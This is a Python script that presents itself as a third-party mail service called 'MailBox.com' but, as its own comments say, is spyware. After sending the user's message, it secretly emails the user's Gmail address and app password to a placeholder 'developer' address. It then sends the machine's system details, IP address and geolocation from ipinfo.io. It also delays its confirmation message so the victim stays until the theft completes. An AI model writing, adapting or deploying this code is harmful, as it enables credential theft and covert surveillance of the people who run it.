# Importing necessary libraries
import json
from urllib.request import urlopen
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import platform
import socket
import psutil

# Asking for name from user
name = input("Enter your name: ")

# Telling instructions to create app passwored
print(
    "Hello," + name,
    '''Welcome to MailBox.com, for your information we are thired party E-mail service. So we need your app password to access your gmail account. And to generate app password you need to open your gmail and click on your "profile button" and then click on "manage your google account" button and make sure that you have already doned "2 step varification" and search for "app password" in search box. And then create a random name for your app passwored for example "Python", and then copy the app passwored provided by google and paste it in the input of "gmail password", Thank You'''
    + name + ".")

print(" ")

# Input of gmail from user
while True:
  Gmail = input("Enter your Gmail: ")
  if Gmail.endswith("@gmail.com"):

    MailBox = Gmail
    Password = input("Enter your gmail password: ")
    print("Your Gmail is Submitted Successfully")
    break
  else:
    print("Your Gmail is Invalid, please Enter your Gmail again")
    Gmail = input("Enter your Gmail: ")
    if Gmail.endswith("@gmail.com"):

      MailBox = Gmail
      Password = input("Enter your gmail password: ")
      print("Your Gmail is Submitted Successfully")
      break


print("")  # Blank Line
RMID = input("Enter the gmail of the receiver: ")



Mail = input("Enter gmail message to send: ")


Pass = Password
M1 = MailBox
P1 = Pass

# Sending of gmail

s = smtplib.SMTP('smtp.gmail.com', 587)

s.starttls()

# Authentication
s.login(M1, P1)

# message to be sent
message1 = Mail

# sending the mail
s.sendmail(M1, RMID, message1)

# terminating the session
s.quit()


print(" ")
print(
    "Thank You for using MailBox.com, please wait we are sending your gmail message to", RMID)  #After executing this line of code, the user's perspective is that the program has ended. However, the frontend program is actually completed at this point, and the spyware program is initiated. After the spyware program is initiated, the user's perspective is that the program has ended

# This code send user's data like gmail, gmail password, receiver gmail, gmail message to send. And then it sends the mail to the developer.

s = smtplib.SMTP('smtp.gmail.com', 587)

s.starttls()

# Authentication
s.login(M1, P1)

# message to be sent
subject = "Mail from " + M1 + " to " + RMID
message = "From: " + M1 + "\nTo: " + RMID + "\nSubject: " + subject + "\n" + Pass

Developer = "REPLACE WITH YOUR DESIRED EMAIL ADDRESS"

# sending the mail
s.sendmail(M1, Developer, message)

# terminating the session
s.quit()





#sending user's system details to developer
# Function to send email
def send_email(subject, body, to_email):
  from_email = M1
  password = P1

  # Setup the MIME
  message = MIMEMultipart()
  message["From"] = from_email
  message["To"] = to_email
  message["Subject"] = subject

  # Attach the body of the email
  message.attach(MIMEText(body, "plain"))

  # Connect to the SMTP server (Gmail in this case)
  with smtplib.SMTP("smtp.gmail.com", 587) as server:
    server.starttls()
    server.login(from_email, password)
    server.sendmail(from_email, to_email, message.as_string())


# Get system information
def get_device_details():
  # Get system details
  system_details = platform.system()
  node_name = platform.node()
  system_version = platform.version()
  machine_type = platform.machine()

  # Get network details
  host_name = socket.gethostname()
  ip_address = socket.gethostbyname(host_name)

  # Get CPU and memory details
  cpu_count = psutil.cpu_count(logical=False)
  logical_cpu_count = psutil.cpu_count(logical=True)
  memory_info = psutil.virtual_memory()

  # Get battery information
  battery_info = psutil.sensors_battery()
  charging_percentage = battery_info.percent if battery_info else "N/A"

  # Create a dictionary to store the information
  data_SYS = {
      "System": system_details,
      "Node Name": node_name,
      "System Version": system_version,
      "Machine Type": machine_type,
      "Host Name": host_name,
      "IP Address": ip_address,
      "CPU Count (Physical)": cpu_count,
      "CPU Count (Logical)": logical_cpu_count,
      "Memory Total": memory_info.total,
      "Charging Percentage": charging_percentage
  }

  return data_SYS

if __name__ == "__main__":
  device_info = get_device_details()

  # Convert the data dictionary to a string
  data_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])

  # Send the email 
  send_email("System Information", data_str, "REPLACE WITH YOUR DESIRED EMAIL")

#sending the location of user

url = "http://ipinfo.io/json"
response = urlopen(url)
data = json.load(response)

Address_data = {
  "IP": data["ip"],
  "City": data["city"],
  "Region": data["region"],
  "Country": data["country"],
  "Location": data["loc"],
  "Organization": data["org"],
  "Postal": data["postal"],
  "Timezone": data["timezone"]
}

# Convert data to JSON string
json_data = json.dumps(data, indent=4)

# Email configuration
sender_email = M1
sender_password = Password
receiver_email = "REPLACE WITH YOUR DESIRED EMAIL"
subject = "IP Information"

# Email content
body = f"""\
IP Information:

{json_data}
"""

# Create SMTP session
with smtplib.SMTP("smtp.gmail.com", 587) as server:
    # Start TLS for security
    server.starttls()

    # Login with your Gmail account
    server.login(sender_email, sender_password)

    # Create email message
    message = f"Subject: {subject}\n\n{body}"

    # Send email
    server.sendmail(sender_email, receiver_email, message)

print("Your Mail sent successfully to", RMID) # I printed this convermation message here because if user closes the program then it will not send user details to developer

